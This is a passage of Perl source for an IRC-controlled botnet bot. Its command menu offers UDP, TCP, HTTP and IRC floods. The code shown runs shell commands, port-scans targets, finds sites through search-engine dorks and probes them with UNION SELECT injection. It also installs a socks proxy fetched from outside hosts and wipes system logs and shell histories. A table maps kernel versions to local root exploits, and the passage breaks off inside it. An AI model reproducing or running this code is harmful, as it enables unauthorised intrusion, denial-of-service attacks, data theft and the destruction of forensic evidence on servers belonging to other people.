               ircase("$pn","$onde","$1") unless ($natrix eq "!evo" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
               $ondep = $onde;
               $ondep = $pn if $onde eq $meunick;
               bfunc("$ondep","$1");
            } else {
               shell("$onde", "$arg");
            }
         }
      }
   }
######################### End of prefix
   elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
      if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
      nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
      $meunick = $2;
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
      foreach my $canal (@canais) {
         sendraw("JOIN $canal $key");
      }
   }
}

sub bfunc {
   my $printl = $_[0];
   my $funcarg = $_[1];
   if (my $pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {

         if ($funcarg =~ /^killme/) {
            sendraw($IRC_cur_socket, "QUIT :");
            $killd = "kill -9 ".fork;
            system (`$killd`);
         }
######################
#                    Commands                      #
######################
         if ($funcarg =~ /^commands/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@9-[auRy B0T Commands List]-14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[auRy/Hacking Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3multiscan <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3socks5");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3sql <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3portscan <ip>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3logcleaner");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3sendmail <subject> <sender> <recipient> <message>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3system");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3cleartmp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3rootable");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3nmap <ip> <beginport> <endport>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3back <ip><port>");   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3linuxhelp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3cd tmp:. | for example");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Advisory/New Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3packetstorm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3milw0rm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[DDos Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3udpflood <host> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3tcpflood <host> <port> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3httpflood <host> <time>"); 
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3sqlflood <host> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[IRC Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3killme");   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3join #channel");   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3part #channel");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3reset");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3voice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3owner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3deowner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3devoice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3halfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3dehalfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3op <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3deop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3msgflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3dccflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3ctcpflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3noticeflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3channelflood");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3maxiflood <who> ");
}

         if ($funcarg =~ /^linuxhelp/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Linux Help]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Dir where you are : pwd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Start a Perl file : perl file.pl");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Go back from dir : cd ..");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Force to Remove a file/dir : rm -rf file/dir;ls -la");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Show all files/dir with permissions : ls -lia");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Find config.inc.php files : find / -type f -name config.inc.php");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Find all writable folders and files : find / -perm -2 -ls");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Find all .htpasswd files : find / -type f -name .htpasswd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@ 3Find all service.pwd files : find / -type f -name service.pwd");
         }
         
         if ($funcarg =~ /^help/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Help Commands]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3flooding - For IRC Flooding Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3irc - For IRC Bot Command Help ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3ddos - For DDos Command Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3news - For Security News Command Help ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3hacking - For Hacking Command Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3linuxhelp - For Linux Help");
         }

         if ($funcarg =~ /^flooding/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[14@13-----[Flooding Based]-----14@4] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3msgflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3dccflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3ctcpflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3noticeflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3channelflood");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3maxiflood <who> ");
         }
         
         if ($funcarg =~ /^irc/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[IRC Commands]-----14@12] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3voice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3owner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3deowner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3devoice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3halfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3dehalfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3op <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3deop <who> ");
         }   
         
         if ($funcarg =~ /^ddos/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Ddos Commands]-----14@12] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3udpflood <host> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3tcpflood <host> <port> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3httpflood <host> <time>"); 
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3sqlflood <host> <time>");
         }   

         if ($funcarg =~ /^news/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[News Commands]-----14@12] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3packetstorm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3milw0rm");
         }   

         if ($funcarg =~ /^hacking/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12,1[14@13-----[Hacking Commands]-----14@12] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3multiscan <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3socks5");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3portscan <ip>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3logcleaner");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3sendmail <subject> <sender> <recipient> <message>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3system");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3cleartmp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3rootable");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3nmap <ip> <beginport> <endport>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3back <ip><port>");   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3linuxhelp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :7!evo 14@3cd tmp:. | for example");
         }                  
######################
#   End of  Help     #
######################
######################
#     Commands       #
######################
         if ($funcarg =~ /^system/) {
            $uname=`uname -a`;
            $uptime=`uptime`;
            $ownd=`pwd`;
            $distro=`cat /etc/issue`;
            $id=`id`;
            $un=`uname -sro`;
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Info BOT : 7 Servidor :Hiden : 6667");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uname -a     : 7 $uname");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Uptime       : 7 $uptime");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Prosses  : 7 $processo");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12ID           : 7 $id");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Own Dir      : 7 $ownd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12OS           : 7 $distro");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Owner        : 7 auRy");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4System Info12:.4| 12Channel      : 7 #ATeN4");
         }

         if ($funcarg =~ /^milw0rm/) {
            my @ltt=();
            my @bug=();
            my $x;
            my $page="";
            my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
            print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
            my @r = <$socke>;
            $page="@r";
            close($socke);
            while ($page =~  m/<title>(.*)</g){
               $x = $1;
               if ($x =~ /\&lt\;/) {
                  $x =~ s/\&lt\;/</g;
               }         
               if ($x !~ /milw0rm/) {
                  push (@bug,$x);
               }
            }
            while ($page =~  m/<link.*expl.*([0-9]...)</g) {
               if ($1 !~ m/milw0rm.com|exploits|en/){
                  push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
               }
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3milw0rm12:.4|12 Latest exploits :");
            foreach $x (0..(@ltt - 1)) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:3milw0rm12:.4|12  $bug[$x] - $ltt[$x]");
               sleep 1;
            }
         }
######################
#      Portscan      #
######################
         if ($funcarg =~ /^portscan (.*)/) {
            my $hostip="$1";
            @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
            my (@aberta, %porta_banner);
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] Scanning for open ports on ".$1." 12 started .");
            foreach my $porta (@portas)  {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
                  'tcp', Timeout => 4);
               if ($scansock) {
                  push (@aberta, $porta);
                  $scansock->close;
               }
            }
 
            if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] Open ports founded: @aberta");
            } else {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Port-Scanner12] No open ports foundend.");
            }
         }

######################
#  End of  Portscan  #
#####################
#####################
# Chk The News from PacketStorm#
######################
if ($funcarg =~ /^packetstorm/) { 
   my $c=0;
   my $x;
   my @ttt=();
   my @ttt1=(); 
   my $sock = IO::Socket::INET->new(PeerAddr=>"www.packetstormsecurity.org",PeerPort=>"80",Proto=>"tcp") or return; 
   print $sock "GET /whatsnew20.xml HTTP/1.0\r\n";
   print $sock "Host: www.packetstormsecurity.org\r\n";
   print $sock "Accept: */*\r\n";
   print $sock "User-Agent: Mozilla/5.0\r\n\r\n"; 
   my @r = <$sock>;
   $page="@r";
   close($sock);
   while ($page =~  m/<link>(.*)<\/link>/g)
   {
           push(@ttt,$1);
   }
   while ($page =~  m/<description>(.*)<\/description>/g)
   { 
          push(@ttt1,$1);
   }
   foreach $x (0..(@ttt - 1))
   {
         sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3PacketStorm12] ".$ttt[$x]." ".$ttt1[$x]."");
      sleep 3;
      $c++;
   }
}
######################
#Auto Install Socks V5 using Mocks#
######################
if ($funcarg =~ /^socks5/) {
   sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512]12 Installing Mocks please wait4");
      system 'cd /tmp';
      system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz';
      system 'tar -xvfz mocks-0.0.2.tar.gz';
      system 'rm -rf mocks-0.0.2.tar.gz';
      system 'cd mocks-0.0.2';
      system 'rm -rf mocks.conf';
      system 'curl -O http://andromeda.covers.de/221/mocks.conf';
      system 'touch mocks.log';
      system 'chmod 0 mocks.log';
         sleep(2);
      system './mocks start';
         sleep(4);
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512]12 Looks like its succesfully installed lets do the last things4   ");

      #lets grab ip
      $net = `/sbin/ifconfig | grep 'eth0'`;
      if (length($net))
      {
      $net = `/sbin/ifconfig eth0 | grep 'inet addr'`;
      if (!length($net))
      {
      $net = `/sbin/ifconfig eth0 | grep 'inet end.'`;
      }
         if (length($net))
      {
         chop($net);
         @netip = split/:/,$net;
         $netip[1] =~ /(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/;
         $ip = $1 .".". $2 .".". $3 .".". $4;
         
            #and print it ^^   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] Connect here :4 ". $ip .":8787 ");
         }
      else
   {
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] IP not founded ");
   }
}
else
{
      sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SocksV512] ERROR WHILE INSTALLING MOCKS ");
}
}
######################
#        Nmap        # 
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner);
       sendraw($IRC_cur_socket, "PRIVMSG $printl : Nmap PortScan 12:. 4|  4: $1:. |.: 4Ports 12:.  4 $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan :. |Founded  4 $porta"."/Open");
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan 12:. 4| Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Nmap12]  Nmap PortScan 12:. 4| No open ports have been founded  13");
             }
          }
######################
#    End of Nmap     # 
######################
######################
#    Log Cleaner     # 
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  This process can be long, just wait");
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
   system 'rm -rf /etc/wtmp';
   system 'rm -rf /var/run/utmp';
   system 'rm -rf /etc/utmp';
   system 'rm -rf /var/log';
   system 'rm -rf /var/logs';
   system 'rm -rf /var/adm';
   system 'rm -rf /var/apache/log';
   system 'rm -rf /var/apache/logs';
   system 'rm -rf /usr/local/apache/log';
   system 'rm -rf /usr/local/apache/logs';
   system 'rm -rf /root/.bash_history';
   system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  All default log and bash_history files erased");
      sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Now Erasing the rest of the machine log files");
   system 'find / -name *.bash_history -exec rm -rf {} \;';
   system 'find / -name *.bash_logout -exec rm -rf {} \;';
   system 'find / -name "log*" -exec rm -rf {} \;';
   system 'find / -name *.log -exec rm -rf {} \;';
      sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Log-Cleaner12]  LogCleaner :. |  Done! All logs erased");
      }
######################
# End of Log Cleaner # 
######################
######################
#              SQL SCANNER              #
######################

if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
   if (my $pid = fork) {
      waitpid($pid, 0);
   } else {
      if (my $d=fork()) {
         addproc($d,"[SQL2] $2");
         exit;
      } else {
         
         my $bug=$1;
         my $dork=$2;
         my $contatore=0;
         my ($type,$space);
         my %hosts;
         my $columns=$3;
         
                        ### Start Message
                        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-Scanner12] Starting Scan for 4$bug $dork");
                        sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3SQL-Scanner12] Initializing on 45 12Search Engines ");
                        ### End of Start Message
            # Starting Google
            my @glist=&google($dork);
                        sendraw($IRC_cur_socket, "PRIVMSG $printl 7[4@3SQL-Scanner12] 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites");
                        my @mlist=&msn($dork);
                        my @asklist=&ask($dork);
                        my @allist=&alltheweb($dork);
                        my @aollist=&aol($dork);
                        my @lycos=&lycos($dork);
                        my @ylist=&yahoo($dork);
                        my @mzlist=&mozbot($dork);
                        my @mamalist&mamma($dork);
                        my @hlist=&hotbot($dork);
                        my @altlist=&altavista($dork);
                        my @slist=&search($dork);
                        my @ulist=&uol($dork);
                        my @fireball=&fireball($dork);   
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 2G4o8o2g3l4e 7[".scalar(@glist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 MSN 7[".scalar(@mlist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 AllTheWeb 7[".scalar(@allist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Ask.com 7[".scalar(@asklist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 AOL 7[".scalar(@aollist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Lycos 7[".scalar(@lycos)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Yahoo! 7[".scalar(@ylist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 MozBot 7[".scalar(@mzlist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Mama 7[".scalar(@mamalist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 HotBot 7[".scalar(@hlist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Altavista 7[".scalar(@altlist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 Search[dot]com 7[".scalar(@slist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 UoL 7[".scalar(@ulist)."7] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4[4@3SQL-Scanner12]12 FireBall 7[".scalar(@flist)."7] Sites");
            
            push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );
            
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Filtruje4 ][ ".scalar(@tot)." 12Stron4 ] ");
            my @puliti=&unici(@tot);
            
            sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ SQL ] [ 12$dork4 ][ ".scalar(@puliti)." 12Stron4 ] ");
         
            my $uni=scalar(@puliti);
                  
                  foreach my $sito (@puliti) {
              
                  $contatore++;
                    if ($contatore %5==0){
                       sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Skanuje4 ][ ".$contatore." 12z4 ".$uni. " 12Stron4 ] ");
                    }
                  sleep 3;
                    if ($contatore==$uni-1){
                     sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ scan ] [ 12Koniec:4 $bug $dork ] ");
                    }   
                  sleep 3;
                    my $site="http://".$sito.$bug;
                  sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Sprawdzam: 4$site 12cols: 4 $columns ] ");
         
         $w=int rand(999);   
         $w=$w*1000;
         for($i=1;$i<=$columns;$i++) {
            splice(@col,0,$#col+1);
            for($j=1;$j<=$i;$j++) {
               push(@col,$w+$j);
            }   
            $tmp=join(",",@col);
            $test=$site."-1+UNION+SELECT+".$tmp."/*";
            print $test."\n";
            $result=get_html($test);
            $result =~ s/\/\*\*\///g;
            $result =~ s/UNION([^(\*)]*)//g;
            for($k=1;$k<=$i;$k++) {
               $n=$w+$k;
                  if($result =~ /$n/){
                     splice(@col2,0,$#col2+1);
                        for($s=1;$s<=$i;$s++) {
                           push(@col2,$s); 
                        }
                     $tmp2=join(",",@col2);
                     $test2="+UNION+SELECT+".$tmp2."/*";
                     push @{$dane{$test2}},$k;
                  } 
            }
         }
         for $klucz (keys %dane) {
            foreach $i(@{$dane{$klucz}}) {
               $klucz =~ s/$i/$i/;
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :13,1 [ vuln ] 9,1 [  ".$site."-1".$klucz."  ]  ");
         }
         %dane=();      
            }
      }
   delproc($$);
   exit;
   }
}
#######  SQL SCANNER  #########

if ($funcarg =~ /^autoscan\s+(.*)\s+http\:\/\/(.*?)\/(.*?)\s+(\d+)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (my $d=fork()) {
addproc($d,"[String] $2");
exit;
} else {
      $kto = $1;
      $host = $2;
      $skrypt = $3;
      $czekac=$4;
      
      #http://ttl.ugu.pl/string/index.php
      my $socke = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>"80",Proto=>"tcp") or return;
      print $socke "GET /$skrypt HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
      
      my @r = <$socke>;
      $page="@r";
   
      $page =~ s/!scan(\s+)//g;
      $page =~ s/!scan(.)//g;
      $page =~ s/\<.*\>//g;
      
      @lines = split (/\n/, $page);
      $ile=scalar(@lines);
            
      
      for($i=9;$i<=$ile;$i+=4) {

         for($j=0;$j<4;$j++) {
            #print $lines[$i+$j]."\n";
            
            sendraw($IRC_cur_socket, "PRIVMSG $printl :$kto $lines[$i+$j]");
            
            sleep 10;
         }
         
         sleep $czekac*60;
      }

   }
      delproc($$);
      exit;
   }
}





#######  SQL SCANNER  #########

if ($funcarg =~ /^sql\s+(.*)\s+(\d+)/){
   if (my $pid = fork()) {
      waitpid($pid, 0);
   } else {
      if (my $d=fork()) {
         addproc($d,"[SQL1] $1 $2");
         exit;
      } else {
         my $site=$1;
         my $columns=$2;
         sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Sprawdzam: 4$site 12cols: 4 $columns ] ");
         
         $w=int rand(999);   
         $w=$w*1000;
         for($i=1;$i<=$columns;$i++) {
            splice(@col,0,$#col+1);
            for($j=1;$j<=$i;$j++) {
               push(@col,$w+$j);
            }   
            $tmp=join(",",@col);
            $test=$site.$bug."-1+UNION+SELECT+".$tmp."/*";
                        #$result=query($test);
            $result=get_html($test);
   
            $result =~ s/\/\*\*\///g;
            $result =~ s/UNION([^(\*)]*)//g;
            for($k=1;$k<=$i;$k++) {
               $n=$w+$k;
                  if($result =~ /$n/){
                     splice(@col2,0,$#col2+1);
                        for($s=1;$s<=$i;$s++) {
                           push(@col2,$s); 
                        }
                     $tmp2=join(",",@col2);
                     $test2="+UNION+SELECT+".$tmp2."/*";
                     push @{$dane{$test2}},$k;
                  } 
            }
         }
         for $klucz (keys %dane) {
            foreach $i(@{$dane{$klucz}}) {
               $klucz =~ s/$i/$i/;
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :13,1 [ vuln ] 9,1 [  ".$site.$bug."-1".$klucz."  ]  ");
         }
         sendraw($IRC_cur_socket, "PRIVMSG $printl :4,16 [ sql ] [ 12Koniec 4 ] ");      
      }
   delproc($$);
   exit;
   }
}
#######  SQL SCANNER  #########
######################
#        Rootable                                     #
######################
if ($funcarg =~ /^rootable/) { 
my $khost = `uname -r`;
my $currentid = `whoami`;
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] Currently you are ".$currentid." ");
sendraw($IRC_cur_socket, "PRIVMSG $printl :12[4@3Rootable12] The kernel of this box is ".$khost." ");
chomp($khost);

   my %h;
   $h{'w00t'} = { 
      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] 
   };
   
   $h{'brk'} = {
      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] 
   };
   
   $h{'ave'} = {
      vuln=>['2.4.19','2.4.20'] 
   };
   
   $h{'elflbl'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'elfdump'} = {
      vuln=>['2.4.27']
   };
   
   $h{'expand_stack'} = {
      vuln=>['2.4.29'] 
   };
   
   $h{'h00lyshit'} = {
      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']
   };
   
   $h{'kdump'} = {
      vuln=>['2.6.13'] 
   };
   
   $h{'km2'} = {
      vuln=>['2.4.18','2.4.22']
   };
   
   $h{'krad'} = {
      vuln=>['2.6.11']
   };
   
   $h{'krad3'} = {
      vuln=>['2.6.11','2.6.9']
   };
   
   $h{'local26'} = {
      vuln=>['2.6.13']
   };
   
   $h{'loko'} = {
      vuln=>['2.4.22','2.4.23','2.4.24'] 
   };
   
   $h{'mremap_pte'} = {
